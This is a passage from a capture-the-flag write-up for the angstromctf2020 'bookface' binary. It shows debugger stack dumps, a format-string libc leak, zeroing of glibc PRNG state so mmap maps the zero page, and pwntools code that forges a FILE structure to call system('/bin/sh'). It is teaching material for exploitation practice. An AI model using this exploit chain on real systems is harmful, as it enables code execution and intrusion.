 Locals at 0x7fffffffdee0, Previous frame's sp is 0x7fffffffdef0
 Saved registers:
  rbp at 0x7fffffffdee0, rip at 0x7fffffffdee8
...
gef➤  telescope 32
0x00007fffffffde70│+0x0000: 0x0000000b00000000	 ← $rsp
0x00007fffffffde78│+0x0008: 0x00007ffff7a9153c  →  &lt;free+76&gt; add rsp, 0x28
0x00007fffffffde80│+0x0010: &quot;%p%p%p%p%p\n&quot;	 ← $rdi
0x00007fffffffde88│+0x0018: 0x00000000000a7025 (&quot;%p\n&quot;?)
0x00007fffffffde90│+0x0020: 0x0000000000000000
0x00007fffffffde98│+0x0028: 0x0000000000000000
0x00007fffffffdea0│+0x0030: &quot;users/2130&quot;
0x00007fffffffdea8│+0x0038: 0x0000555555003033 (&quot;30&quot;?)
0x00007fffffffdeb0│+0x0040: 0x0000000000000000
0x00007fffffffdeb8│+0x0048: 0x00005555555581b0  →  &lt;_start+0&gt; endbr64 
0x00007fffffffdec0│+0x0050: 0x00007fffffffe030  →  0x0000000000000001
0x00007fffffffdec8│+0x0058: 0x00007ffff7a7a363  →  &lt;fclose+259&gt; mov eax, ebp
0x00007fffffffded0│+0x0060: 0x0000000000000000
0x00007fffffffded8│+0x0068: 0xf46cff2f1bf3ec00
0x00007fffffffdee0│+0x0070: 0x00007fffffffdf50  →  0x00005555555589a0  →  &lt;__libc_csu_init+0&gt; endbr64 	 ← $rbp
0x00007fffffffdee8│+0x0078: 0x0000555555558985  →  &lt;main+681&gt; jmp 0x555555558992 &lt;main+694&gt;
0x00007fffffffdef0│+0x0080: 0x0000000000000001
0x00007fffffffdef8│+0x0088: 0x000003e8ffffdf70
0x00007fffffffdf00│+0x0090: 0x00007ffff7ffe168  →  0x0000555555554000  →  0x00010102464c457f
0x00007fffffffdf08│+0x0098: 0x000055555557e010  →  0x00000000fbad240c
0x00007fffffffdf10│+0x00a0: &quot;users/2130&quot;
0x00007fffffffdf18│+0x00a8: 0x0000555555003033 (&quot;30&quot;?)
0x00007fffffffdf20│+0x00b0: 0x00007fffffffdf4e  →  0x5555555589a0f46c
0x00007fffffffdf28│+0x00b8: 0x0000000000000000
0x00007fffffffdf30│+0x00c0: 0x00005555555589a0  →  &lt;__libc_csu_init+0&gt; endbr64 
0x00007fffffffdf38│+0x00c8: 0x00005555555581b0  →  &lt;_start+0&gt; endbr64 
0x00007fffffffdf40│+0x00d0: 0x00007fffffffe030  →  0x0000000000000001
0x00007fffffffdf48│+0x00d8: 0xf46cff2f1bf3ec00
0x00007fffffffdf50│+0x00e0: 0x00005555555589a0  →  &lt;__libc_csu_init+0&gt; endbr64 
0x00007fffffffdf58│+0x00e8: 0x00007ffff7a2d830  →  &lt;__libc_start_main+240&gt; mov edi, eax
0x00007fffffffdf60│+0x00f0: 0x0000000000000001
0x00007fffffffdf68│+0x00f8: 0x00007fffffffe038  →  0x00007fffffffe332  →  &quot;/home/philomath213/Documents/CTFs/angstromctf2020/[...]&quot;

</code></pre><p>The login function stack frame is located at <em>0x7fffffffdef0</em> (<em>$rsp+0x0090</em>), and the saved return address is located at <em>0x7fffffffdee8</em> (<em>$rsp+0x0078</em>) this pointer will give us the binary base where it&rsquo;s loaded, there is another interesting pointer at <em>0x00007fffffffdf58</em> (<em>$rsp+0x00e8</em>) a libc pointer, it will give us libc base address.</p><p>The format string offset for the 1st pointer will be <em>21</em> (<code>%21$p</code>) while the 2nd will be <em>35</em> (<code>%35$p</code>).</p><p>In order to calculate the base address from these two pointers we need precalculate the offsets.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gef&gt;  vmmap 
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555558000 0x0000000000000000 r-- /home/philomath213/Documents/CTFs/angstromctf2020/bookface/bookface
...
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6
...
</code></pre></div><p>The binary base address is <em>0x0000555555554000</em> and the leaked address is <em>0x0000555555558985</em>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gef&gt;  p 0x0000555555558985 - 0x0000555555554000
$1 <span style=color:#f92672>=</span> 0x4985

</code></pre></div><p>We do the same for libc address.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gef&gt;  p 0x00007ffff7a2d830 - 0x00007ffff7a0d000
$2 <span style=color:#f92672>=</span> 0x20830

</code></pre></div><h4 id=libc-address-leak-exploit>libc address leak exploit</h4><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>libc_offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x20830</span>

uid <span style=color:#f92672>=</span> randint(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span><span style=color:#f92672>**</span><span style=color:#ae81ff>30</span>)

<span style=color:#75715e># create user with uid and name AAAA</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Please enter your user ID: &#34;</span>, str(uid))
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;What&#39;s your name? &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;AAAA&#34;</span>)

<span style=color:#75715e># logout</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;&gt; &#34;</span>, <span style=color:#e6db74>&#34;4&#34;</span>)
<span style=color:#75715e># login again with same uid</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Please enter your user ID: &#34;</span>, str(uid))

<span style=color:#75715e># format string offset</span>
payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;AA%35$pBB&#39;</span>

<span style=color:#66d9ef>assert</span> len(payload) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>12</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Content: &#34;</span>, payload)

T<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;AA&#39;</span>)
leak <span style=color:#f92672>=</span> T<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;BB&#39;</span>)<span style=color:#f92672>.</span>strip(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;BB&#39;</span>)
leak <span style=color:#f92672>=</span> int(leak, base<span style=color:#f92672>=</span><span style=color:#ae81ff>16</span>)
log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;leak: 0x{:016x}&#34;</span><span style=color:#f92672>.</span>format(leak))

libc_base <span style=color:#f92672>=</span> leak <span style=color:#f92672>-</span> libc_offset
log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;libc_base: 0x{:016x}&#34;</span><span style=color:#f92672>.</span>format(libc_base))
</code></pre></div><h4 id=zero-page>Zero Page</h4><p>We need to write the forged <em>FILE</em> structure into the <em>Zero Page</em> (i.e. memory page at <em>0x0000000000000000</em>), when login with a new userid the following instruction will be executed:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>puts(<span style=color:#e6db74>&#34;Welcome to bookface!&#34;</span>);
user <span style=color:#f92672>=</span> mmap(rand()<span style=color:#f92672>&amp;</span><span style=color:#ae81ff>0xfffffffffffff000</span>, <span style=color:#66d9ef>sizeof</span> (<span style=color:#66d9ef>struct</span> profile), PROT_READ<span style=color:#f92672>|</span>PROT_WRITE, MAP_PRIVATE<span style=color:#f92672>|</span>MAP_ANONYMOUS<span style=color:#f92672>|</span>MAP_FIXED, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>);
printf(<span style=color:#e6db74>&#34;What&#39;s your name? &#34;</span>);
fgets(user<span style=color:#f92672>-&gt;</span>name, <span style=color:#ae81ff>0x100</span>, stdin);
</code></pre></div><p><code>mmap</code> will map a page at <code>rand() & 0xfffffffffffff000</code>, there are two ways (maybe more) to make that value be zero:</p><h4 id=1-easy-dirty-way-brutforce>1. Easy dirty way &ldquo;Brutforce&rdquo;:</h4><p><code>rand()</code> (see <code>man 3 rand</code>) will return a pseudo-random integer in range <code>[0, RAND_MAX]</code>, <code>RAND_MAX</code> dependent on the implementation, but it&rsquo;s guaranteed that this value is at least <em>32767</em> (<em>0x7fff</em>)<sup id=fnref:7><a href=#fn:7 class=footnote-ref role=doc-noteref>7</a></sup>. there is a chance that <code>rand()</code> will return a integer less than <em>0x1000</em>.</p><h4 id=2-hard-efficient-way-abusing-glibc-prng>2. Hard efficient way &ldquo;Abusing glibc PRNG&rdquo;:</h4><p><em>glibc</em> pseudo-random-number-generator (<em>PRNG</em>)<sup id=fnref:8><a href=#fn:8 class=footnote-ref role=doc-noteref>8</a></sup> like any <em>PRNG</em> generates a sequence of random numbers, this sequence is not truly random, because it is determined by the <em>PRNG</em>&rsquo;s state which is initially the seed value set by <code>srand</code>, in our case it is <code>time(NULL)</code>, <em>glibc PRNG</em> (see <code>man 3 rand</code>) use hidden state that is modified on each call, this hidden state is probably located at writable memory in libc address space.</p><p>To find how <em>glibc PRNG</em> works we need to dig deeper in <em>glibc</em> source code, I usually use <strong>Bootlin - Elixir Cross Referencer</strong> <sup id=fnref:9><a href=#fn:9 class=footnote-ref role=doc-noteref>9</a></sup> to browse Linux Kernel and Glibc source code, actually the <code>rand</code> function is just wrapper to <code>__random</code> and the latter is also a wrapper to <code>__random_r</code>, make sure you are browsing the correct glibc version <strong>glibc-2.23</strong> <sup id=fnref:10><a href=#fn:10 class=footnote-ref role=doc-noteref>10</a></sup>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>int</span>
<span style=color:#a6e22e>rand</span> (<span style=color:#66d9ef>void</span>)
{
  <span style=color:#66d9ef>return</span> (<span style=color:#66d9ef>int</span>) __random ();
}
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>long</span> <span style=color:#66d9ef>int</span>
<span style=color:#a6e22e>__random</span> (<span style=color:#66d9ef>void</span>)
{
  int32_t retval;

  __libc_lock_lock (lock);

  (<span style=color:#66d9ef>void</span>) __random_r (<span style=color:#f92672>&amp;</span>unsafe_state, <span style=color:#f92672>&amp;</span>retval);

  __libc_lock_unlock (lock);

  <span style=color:#66d9ef>return</span> retval;
}
</code></pre></div><p><code>__random_r</code> is defined in <code>stdlib/random_r.c</code> line <code>353</code><sup id=fnref:11><a href=#fn:11 class=footnote-ref role=doc-noteref>11</a></sup>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>
<span style=color:#66d9ef>int</span>
<span style=color:#a6e22e>__random_r</span> (<span style=color:#66d9ef>struct</span> random_data <span style=color:#f92672>*</span>buf, int32_t <span style=color:#f92672>*</span>result)
{
  int32_t <span style=color:#f92672>*</span>state;

  <span style=color:#66d9ef>if</span> (buf <span style=color:#f92672>==</span> NULL <span style=color:#f92672>||</span> result <span style=color:#f92672>==</span> NULL)
    <span style=color:#66d9ef>goto</span> fail;

  state <span style=color:#f92672>=</span> buf<span style=color:#f92672>-&gt;</span>state;

  <span style=color:#66d9ef>if</span> (buf<span style=color:#f92672>-&gt;</span>rand_type <span style=color:#f92672>==</span> TYPE_0)
    {
      int32_t val <span style=color:#f92672>=</span> state[<span style=color:#ae81ff>0</span>];
      val <span style=color:#f92672>=</span> ((state[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>1103515245</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>12345</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x7fffffff</span>;
      state[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> val;
      <span style=color:#f92672>*</span>result <span style=color:#f92672>=</span> val;
    }
  <span style=color:#66d9ef>else</span>
    {
      int32_t <span style=color:#f92672>*</span>fptr <span style=color:#f92672>=</span> buf<span style=color:#f92672>-&gt;</span>fptr;
      int32_t <span style=color:#f92672>*</span>rptr <span style=color:#f92672>=</span> buf<span style=color:#f92672>-&gt;</span>rptr;
      int32_t <span style=color:#f92672>*</span>end_ptr <span style=color:#f92672>=</span> buf<span style=color:#f92672>-&gt;</span>end_ptr;
      int32_t val;

      val <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>fptr <span style=color:#f92672>+=</span> <span style=color:#f92672>*</span>rptr;
      <span style=color:#75715e>/* Chucking least random bit.  */</span>
      <span style=color:#f92672>*</span>result <span style=color:#f92672>=</span> (val <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x7fffffff</span>;
      <span style=color:#f92672>++</span>fptr;
      <span style=color:#66d9ef>if</span> (fptr <span style=color:#f92672>&gt;=</span> end_ptr)
	{
	  fptr <span style=color:#f92672>=</span> state;
	  <span style=color:#f92672>++</span>rptr;
	}
      <span style=color:#66d9ef>else</span>
	{
	  <span style=color:#f92672>++</span>rptr;
	  <span style=color:#66d9ef>if</span> (rptr <span style=color:#f92672>&gt;=</span> end_ptr)
	    rptr <span style=color:#f92672>=</span> state;
	}
      buf<span style=color:#f92672>-&gt;</span>fptr <span style=color:#f92672>=</span> fptr;
      buf<span style=color:#f92672>-&gt;</span>rptr <span style=color:#f92672>=</span> rptr;
    }
  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;

 fail:
  __set_errno (EINVAL);
  <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
}
</code></pre></div><p>At the beginning of the function there is a test for the random type, from code comments we see that there two types, if <code>rand_type == TYPE_0</code> the old linear congruential bit will be used. Otherwise, the fancy trinomial stuff.</p><p>We don&rsquo;t know which one is beening used in our libc, we will use a debugger to figure it out.</p><pre><code class=language-none data-lang=none>gef&gt;  disas random_r
Dump of assembler code for function random_r:
   0x00007ffff7a47c40 &lt;+0&gt;:		test   rdi,rdi
   0x00007ffff7a47c43 &lt;+3&gt;:		je     0x7ffff7a47cc0 &lt;random_r+128&gt;
   0x00007ffff7a47c45 &lt;+5&gt;:		test   rsi,rsi
   0x00007ffff7a47c48 &lt;+8&gt;:		je     0x7ffff7a47cc0 &lt;random_r+128&gt;
   0x00007ffff7a47c4a &lt;+10&gt;:	mov    eax,DWORD PTR [rdi+0x18]
   0x00007ffff7a47c4d &lt;+13&gt;:	mov    r8,QWORD PTR [rdi+0x10]
   0x00007ffff7a47c51 &lt;+17&gt;:	test   eax,eax
   0x00007ffff7a47c53 &lt;+19&gt;:	je     0x7ffff7a47ca0 &lt;random_r+96&gt;
   0x00007ffff7a47c55 &lt;+21&gt;:	mov    rax,QWORD PTR [rdi]
   ...
</code></pre><p>The condition is at *<em>random_r+17</em>, set a break point there and examin <em>rax</em> register</p><pre><code class=language-none data-lang=none>gef&gt;  run
...
gef&gt;  b *random_r+17
....
gef&gt;  continue
....
gef&gt;  info registers rax
rax            0x3                 0x3
</code></pre><p>The random type isn&rsquo;t <code>TYPE_0</code>, so the 2nd part of code will be used to compute the next random integer, it will be written to the 2nd parameter <code>int32_t *result</code> which is the <code>retval</code> variable in <code>__random</code> function.</p><p>the result is <code>*result = (val >> 1) & 0x7fffffff</code> and <code>val = *fptr += *rptr</code>, so in order to make <code>rand()</code> return a 0 we need to overwrite <code>*fptr</code> and <code>*rptr</code> with zero (i.e. val = 0 => *result = 0 ), those two pointer change after each call to random, we need to find the right ones for the right call, (e.g. if we want the 2nd call returns 0, we call rand once then debug the 2nd call to get the right pointers), this is the eays way to get them.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>int32_t <span style=color:#f92672>*</span>fptr <span style=color:#f92672>=</span> buf<span style=color:#f92672>-&gt;</span>fptr;
int32_t <span style=color:#f92672>*</span>rptr <span style=color:#f92672>=</span> buf<span style=color:#f92672>-&gt;</span>rptr;
</code></pre></div><p>This piece of code corespands to:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>   0x7f7aa7c72c56 &lt;random_r+22&gt;    mov    eax, DWORD PTR <span style=color:#f92672>[</span>rdi<span style=color:#f92672>]</span>
   0x7f7aa7c72c58 &lt;random_r+24&gt;    mov    rcx, QWORD PTR <span style=color:#f92672>[</span>rdi+0x8<span style=color:#f92672>]</span>
</code></pre></div><p>The values of <code>fptr</code> and <code>rptr</code> will <code>rax</code> and <code>rcx</code> respectivly</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gef&gt;  b *random_r+24
...
gef&gt;  i r rax rcx
rax            0x7f7aa7ffc0c4      0x7f7aa7ffc0c4
rcx            0x7f7aa7ffc0b8      0x7f7aa7ffc0b8
gef➤  p 0x7f7aa7ffc0b8 - 0x00007f7aa7c38000
$1 <span style=color:#f92672>=</span> 0x3c40b8
</code></pre></div><p>the offset to <code>*rptr</code> is <code>0x3c40b8</code> while <code>*fptr</code> is <code>0x3c40c4</code>, <em>12</em> bytes distance bitween them.</p><p>We can overwrite this address with null value using the <code>friends</code> pointer in <code>profile</code> structure, we will use option one to increment it to points to <code>*rptr</code>, overwrite with zero then do the same to <code>*fptr</code>.</p><p>The friends pointer is of type <code>long long*</code> and it equals to 0 initialy, in pointer arithmetic for a given pointer <code>x</code>, <code>x + 5</code> actually is <code>x + 5*sizeof(data_type)</code>, we have <code>sizeof(long long) == 8</code>, so we increment friends pointer with <code>(*rptr address) / 8</code>.</p><h4 id=set-random-state-fptr-and-rptr-to-0>Set random state fptr and rptr to 0</h4><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>random_state_offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x3c40b8</span>
random_state <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> random_state_offset
<span style=color:#75715e># set random_state fptr and rptr to 0</span>
<span style=color:#75715e># in order to make rand() return 0</span>
<span style=color:#75715e># fptr</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;&gt; &#34;</span>, <span style=color:#e6db74>&#34;1&#34;</span>)
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;you like to make? &#34;</span>, str(random_state<span style=color:#f92672>//</span><span style=color:#ae81ff>8</span>))

<span style=color:#75715e># logout</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;&gt; &#34;</span>, <span style=color:#e6db74>&#34;4&#34;</span>)
<span style=color:#75715e># login again with the same</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Please enter your user ID: &#34;</span>, str(uid))

T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Content: &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>11</span>)
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Content: &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>11</span>)

<span style=color:#75715e># rptr = rptr + 8</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;&gt; &#34;</span>, <span style=color:#e6db74>&#34;1&#34;</span>)
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;you like to make? &#34;</span>, str(<span style=color:#ae81ff>8</span><span style=color:#f92672>//</span><span style=color:#ae81ff>8</span>))

<span style=color:#75715e># logout</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;&gt; &#34;</span>, <span style=color:#e6db74>&#34;4&#34;</span>)
<span style=color:#75715e># login again with the same uid</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Please enter your user ID: &#34;</span>, str(uid))

T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Content: &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>11</span>)
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Content: &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>11</span>)
</code></pre></div><p>After that will login with a new userid in order to allocate a <em>Zero Page</em> and write into it the forged <em>FILE</em> structure.</p><p>I used the same code in <sup id=fnref:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup> with little modification to make the <em>FILE</em> structure.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>pack_file</span>(_flags<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _IO_read_ptr<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _IO_read_end<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _IO_read_base<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _IO_write_base<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _IO_write_ptr<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _IO_write_end<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _IO_buf_base<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _IO_buf_end<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _IO_save_base<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _IO_backup_base<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _IO_save_end<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _IO_marker<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _IO_chain<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _fileno<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
              _lock<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>):
    struct <span style=color:#f92672>=</span> p32(_flags) <span style=color:#f92672>+</span> \
        p32(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>+</span> \
        p64(_IO_read_ptr) <span style=color:#f92672>+</span> \
        p64(_IO_read_end) <span style=color:#f92672>+</span> \
        p64(_IO_read_base) <span style=color:#f92672>+</span> \
        p64(_IO_write_base) <span style=color:#f92672>+</span> \
        p64(_IO_write_ptr) <span style=color:#f92672>+</span> \
        p64(_IO_write_end) <span style=color:#f92672>+</span> \
        p64(_IO_buf_base) <span style=color:#f92672>+</span> \
        p64(_IO_buf_end) <span style=color:#f92672>+</span> \
        p64(_IO_save_base) <span style=color:#f92672>+</span> \
        p64(_IO_backup_base) <span style=color:#f92672>+</span> \
        p64(_IO_save_end) <span style=color:#f92672>+</span> \
        p64(_IO_marker) <span style=color:#f92672>+</span> \
        p64(_IO_chain) <span style=color:#f92672>+</span> \
        p32(_fileno)
    struct <span style=color:#f92672>=</span> struct<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x88</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>)
    struct <span style=color:#f92672>+=</span> p64(_lock)
    struct <span style=color:#f92672>=</span> struct<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0xd8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>)
    <span style=color:#66d9ef>return</span> struct


<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>make_fake_file_struct</span>(libc_base, rip, rdi):
    <span style=color:#75715e># We can only have even rdi</span>
    <span style=color:#66d9ef>assert</span>(rdi <span style=color:#f92672>%</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)

    <span style=color:#75715e># Crafting FILE structure</span>

    <span style=color:#75715e># This stores the address of a pointer to the _IO_str_overflow function</span>
    <span style=color:#75715e># Libc specific</span>
    io_str_overflow_ptr_addr <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> \
        libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;_IO_file_jumps&#39;</span>] <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xd8</span>
    <span style=color:#75715e># Calculate the vtable by subtracting appropriate offset</span>
    fake_vtable_addr <span style=color:#f92672>=</span> io_str_overflow_ptr_addr <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span>

    <span style=color:#75715e># Craft file struct</span>
    file_struct <span style=color:#f92672>=</span> pack_file(_IO_buf_base<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
                            _IO_buf_end<span style=color:#f92672>=</span>(rdi<span style=color:#f92672>-</span><span style=color:#ae81ff>100</span>)<span style=color:#f92672>//</span><span style=color:#ae81ff>2</span>,
                            _IO_write_ptr<span style=color:#f92672>=</span>(rdi<span style=color:#f92672>-</span><span style=color:#ae81ff>100</span>)<span style=color:#f92672>//</span><span style=color:#ae81ff>2</span>,
                            _IO_write_base<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>,
                            _lock<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>)
    <span style=color:#75715e># vtable pointer</span>
    file_struct <span style=color:#f92672>+=</span> p64(fake_vtable_addr)
    <span style=color:#75715e># Next entry corresponds to: (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer)</span>
    file_struct <span style=color:#f92672>+=</span> p64(rip)

    <span style=color:#66d9ef>return</span> file_struct
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># logout</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;&gt; &#34;</span>, <span style=color:#e6db74>&#34;4&#34;</span>)
<span style=color:#75715e># login again with wrong uid</span>
uid <span style=color:#f92672>=</span> randint(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span><span style=color:#f92672>**</span><span style=color:#ae81ff>30</span>)
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Please enter your user ID: &#34;</span>, str(uid))

raw_input(<span style=color:#e6db74>&#34;&gt; Debug&#34;</span>)
<span style=color:#75715e># Our target</span>
<span style=color:#75715e># mmap to 0</span>
file_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
rip <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]
<span style=color:#75715e># rdi = libc_base + next(libc.search(b&#34;/bin/sh&#34;))  # The first param we want</span>
<span style=color:#75715e># next to file_struct</span>
rdi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xf0</span>

log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;file_addr 0x{:016x}&#34;</span><span style=color:#f92672>.</span>format(file_addr))
log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;rip 0x{:016x}&#34;</span><span style=color:#f92672>.</span>format(rip))
log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;rdi 0x{:016x}&#34;</span><span style=color:#f92672>.</span>format(rdi))

file_struct <span style=color:#f92672>=</span> make_fake_file_struct(libc_base, rip, rdi)

file_struct <span style=color:#f92672>=</span> file_struct<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0xf0</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
payload <span style=color:#f92672>=</span> file_struct <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>
<span style=color:#66d9ef>assert</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> payload

T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;What&#39;s your name? &#34;</span>, payload)
